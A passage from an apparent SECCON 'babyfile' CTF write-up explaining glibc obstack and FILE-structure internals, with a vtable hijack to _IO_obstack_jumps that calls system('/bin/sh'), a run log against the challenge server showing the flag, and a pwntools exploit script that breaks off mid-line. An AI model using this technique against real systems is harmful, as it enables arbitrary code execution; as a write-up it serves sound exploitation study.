class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">				      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">				      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">				      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">				     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">				     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Once <code>obstack_1grow</code> is called, if <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>, <code>_obstack_newchunk</code> gets called.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)					      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);				      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, 1);					      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);				      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>

<p><strong>Condition</strong>: <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate a new current chunk for the obstack *H</span></span><br><span class="line"><span class="comment">   on the assumption that LENGTH bytes need to be added</span></span><br><span class="line"><span class="comment">   to the current object, or a new object of length LENGTH allocated.</span></span><br><span class="line"><span class="comment">   Copies any partial object from the end of the old chunk</span></span><br><span class="line"><span class="comment">   to the beginning of the new one.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="type">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="type">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">	   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	((COPYING_UNIT *) object_base)[i]</span><br><span class="line">	  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment">	 but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment">	 which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">	  == __PTR_ALIGN ((<span class="type">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">			  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">libc_hidden_def (_obstack_newchunk)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>The interesting part of the function is the call to the <code>CALL_CHUNKFUN</code> macro that calls a raw <em>unencrypted</em> function pointer referenced by the <code>obstack</code> structure with either a controlled argument (<code>(h)-&gt;extra_arg</code>) or only with the size.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_FREEFUN(h, old_chunk) \</span></span><br><span class="line"><span class="meta">  do &#123; \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> ((h)-&gt;use_extra_arg)						      \</span></span><br><span class="line"><span class="meta">	(*(h)-&gt;freefun)((h)-&gt;extra_arg, (old_chunk));			      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">	(*(void (*)(void *))(h)-&gt;freefun)((old_chunk));		      \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>If I summarize, to call <code>system(&quot;/bin/sh&quot;</code> we need to have:</p>
<ul>
<li><code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;freefun</code> &#x3D; <code>&amp;system</code></li>
<li><code>(h)-&gt;extra_arg</code> &#x3D; <code>&amp;&quot;/bin/sh&quot;</code></li>
<li><code>(h)-&gt;use_extra_arg</code> !&#x3D; 0</li>
</ul>
<p>Which gives:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_IO_obstack_jumps = leak + <span class="number">0x1E9260</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;_IO_obstack_jumps: <span class="subst">&#123;<span class="built_in">hex</span>(_IO_obstack_jumps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit vtable =&gt; _IO_obstack_jumps</span></span><br><span class="line">write_ptr(pwn.p64(_IO_obstack_jumps - <span class="number">8</span> * <span class="number">9</span>), File.vtable)</span><br><span class="line">write_ptr(pwn.p64(heap + <span class="number">0x2a0</span>), File.obstack)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0xff</span>), File._IO_read_base)</span><br><span class="line"></span><br><span class="line">write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) <span class="comment"># fn ptr, system</span></span><br><span class="line">write_ptr(pwn.p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))), obstack.extra_arg) <span class="comment"># arg</span></span><br><span class="line">partial_write(pwn.p8(<span class="literal">True</span>), obstack.use_extra_arg)</span><br><span class="line"></span><br><span class="line">fflush()</span><br><span class="line"><span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br></pre></td></tr></table></figure>

<h1 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h1><p>After optimizing a lot my exploit (my french connection sucks), here we are:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157</span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/seccon/babyfile/chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to babyfile.seccon.games on port 3157: Done</span><br><span class="line">[*] libc: 0x7fe2bc538000</span><br><span class="line">[*] heap: 0x55fd27776000</span><br><span class="line">[*] _IO_obstack_jumps: 0x7fe2bc721260</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">SECCON&#123;r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h1 id="Annexes"><a href="#Annexes" class="headerlink" title="Annexes"></a>Annexes</h1><p>Final exploit:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(<span class="string">&#x27;chall&#x27;</span>)</span><br><span class="line">libc = pwn.context.binary = pwn.ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"><span class="comment"># pwn.context.timeout = 1000</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /home/nasm/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">io = <span class="literal">None</span></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">File</span>:</span><br><span class="line">    flags          = <span class="number">0x0</span></span><br><span class="line">    _IO_read_base  = <span class="number">24</span></span><br><span class="line">    _IO_read_end   = <span class="number">0x10</span></span><br><span class="line">    _IO_write_base = <span class="number">0x20</span></span><br><span class="line">    _IO_write_ptr  = <span class="number">0x28</span></span><br><span class="line">    _IO_write_end  = <span class="number">0x30</span></span><br><span class="line">    _IO_buf_base   = <span class="number">0x38</span></span><br><span class="line">    _IO_buf_end    = <span class="number">0x40</span></span><br><span class="line">    fileno         = <span class="number">0x70</span></span><br><span class="line">    vtable         = <span class="number">0xd8</span></span><br><span class="line">    obstack       = <span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obstack</span>:</span><br><span class="line">    chunkfun       = <span class="number">56</span></span><br><span class="line">    extra_arg      = <span class="number">56</span>+<span class="number">16</span></span><br><span class="line">    use_extra_arg  = <span class="number">56</span>+<span class="number">16</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fflush</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trick</span>(<span class="params">offt, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;offset: &quot;</span>, <span class="built_in">str</span>(offt).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;value: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span>, debug=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> ptr[i]:</span><br><span class="line">            trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write2</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    write_ptr(ptr, File._IO_write_base)</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="built_in">int</span>.from_bytes(ptr, byteorder=<span class="string">&quot;little&quot;</span>)+<span class="number">8</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    write_ptr(dest, File._IO_write_ptr)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    ret = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># do_allocate</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa8</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># _IO_file_underflow =&gt; _IO_default_pbackfail</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x60</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    int</span></span><br><span class="line"><span class="string">    _IO_default_pbackfail (FILE *fp, int c)</span></span><br><span class="line"><span class="string">    =&gt; not _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_base == _IO_write_ptr</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_end == _IO_write_ptr + 8</span></span><br><span class="line"><span class="string">    =&gt; _IO_write_end = right size</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(<span class="number">0xfbad1800</span> | <span class="number">0x8000</span>), File.flags)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x70</span>), 